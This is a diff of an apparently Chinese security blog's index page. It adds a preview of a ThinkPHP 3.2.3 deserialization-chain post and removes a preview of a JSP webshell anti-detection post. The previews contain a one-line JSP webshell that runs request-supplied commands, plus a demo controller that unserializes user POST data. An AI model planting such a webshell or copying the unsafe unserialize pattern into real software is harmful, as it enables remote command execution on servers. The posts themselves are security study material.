@@ -167,6 +167,59 @@
   <div class="post-item">
     
     <div class="post-item-info">
+      <a class="post-title" href="/2022/05/17/tp3unser/" title="thinkphp3.2.3反序列化初探 ">
+        
+        thinkphp3.2.3反序列化初探
+        
+      </a>
+      <div class="post-description">
+        
+        前言摆了好几天，好几个人老说我前言说摆烂，确实是在摆烂，前两天浅学了一下thinkphp3，今天来学学thinkphp3反序列化链构造反序列化链分析首先我们需要通过thinkphp来写一个反序列化的demo&amp;lt;?phpnamespaceHome\Controller;useThink\Controller;classIndexControllerextendsController&amp;#123;publicfunctionindex()&amp;#123;$a=unserialize(base64_decode(I(&amp;#x27;post.data&amp;#x27;)));&amp;#125;&amp;#125;php的反序列化和java不同，php的反序列化起点大部分是那俩魔术方法__wakeup和__destruct,因此我们寻找反序列化链就需要去搜寻这种魔术方法,其实有个小技巧，就是在找反序列化起点的类的时候，尽可能去找可控变量多的类，因为可控变量多才能让我们控制程序的可能更大。这里我们找到Think\Image\Driver\Imagick这个类，他这里的img属性可控publicfunction__d...
+      </div>
+      <div class="post-meta-wrap">
+        <span class="post-meta-date">
+          <i class="far fa-calendar-alt"></i>
+          <span>发表于 </span>
+          <span>
+            2022-05-17
+          </span>
+        </span>
+        
+
+        
+        <span class="post-tag">
+          <i class="fa fa-tag"></i>
+          
+          <a href="/tags/web%E5%AE%89%E5%85%A8/">
+            web安全
+          </a>
+          
+          <i class="fas fa-angle-right"></i>
+          
+          
+          <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+            代码审计
+          </a>
+          
+          <i class="fas fa-angle-right"></i>
+          
+          
+          <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+            反序列化
+          </a>
+          
+          
+        </span>
+        
+      </div>
+    </div>
+
+  </div>
+  
+  
+  <div class="post-item">
+    
+    <div class="post-item-info">
       <a class="post-title" href="/2022/05/15/tp3/" title="从0到1学习ThinkPHP3.2.3 ">
         
         从0到1学习ThinkPHP3.2.3
@@ -577,73 +630,6 @@
           
           <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
             渗透测试
-          </a>
-          
-          
-        </span>
-        
-      </div>
-    </div>
-
-  </div>
-  
-  
-  <div class="post-item">
-    
-    <div class="post-item-info">
-      <a class="post-title" href="/2022/04/22/bypassJsp/" title="Jsp Webshell免杀 ">
-        
-        Jsp Webshell免杀
-        
-      </a>
-      <div class="post-description">
-        
-        前言之前只会写最简单webshell，今天来不系统地学习一下Jsp的webshell的免杀方式一句话Webshell从一句话木马角度来说，最简单的应该是&amp;lt;%Runtime.getRuntime().exec(request.getParameter(&amp;quot;cmd&amp;quot;));%&amp;gt;直接调用了Runtime的exec方法，并且不进行回显，适用于反弹shell，但是就没法进行一些其他的操作，并且是个WAF都会拦如果说需要加上回显，应该写成如下&amp;lt;%@pageimport=&amp;quot;java.io.InputStream&amp;quot;%&amp;gt;&amp;lt;%@pageimport=&amp;quot;java.io.InputStreamReader&amp;quot;%&amp;gt;&amp;lt;%@pageimport=&amp;quot;java.io.BufferedReader&amp;quot;%&amp;gt;&amp;lt;%@pagelanguage=&amp;quot;java&amp;quot;pageEncoding=&amp;quot;UTF-8&amp;quot;%&amp;gt;&amp;lt;%Runtimert=Runtime.getRu...
-      </div>
-      <div class="post-meta-wrap">
-        <span class="post-meta-date">
-          <i class="far fa-calendar-alt"></i>
-          <span>发表于 </span>
-          <span>
-            2022-04-22
-          </span>
-        </span>
-        
-
-        
-        <span class="post-tag">
-          <i class="fa fa-tag"></i>
-          
-          <a href="/tags/web%E5%AE%89%E5%85%A8/">
-            web安全
-          </a>
-          
-          <i class="fas fa-angle-right"></i>
-          
-          
-          <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-            代码审计
-          </a>
-          
-          <i class="fas fa-angle-right"></i>
-          
-          
-          <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-            渗透测试
-          </a>
-          
-          <i class="fas fa-angle-right"></i>
-          
-          
-          <a href="/tags/Java%E5%AE%89%E5%85%A8/">
-            Java安全
-          </a>
-          
-          <i class="fas fa-angle-right"></i>
-          
-          
-          <a href="/tags/%E5%85%8D%E6%9D%80/">
-            免杀
           </a>
           
           
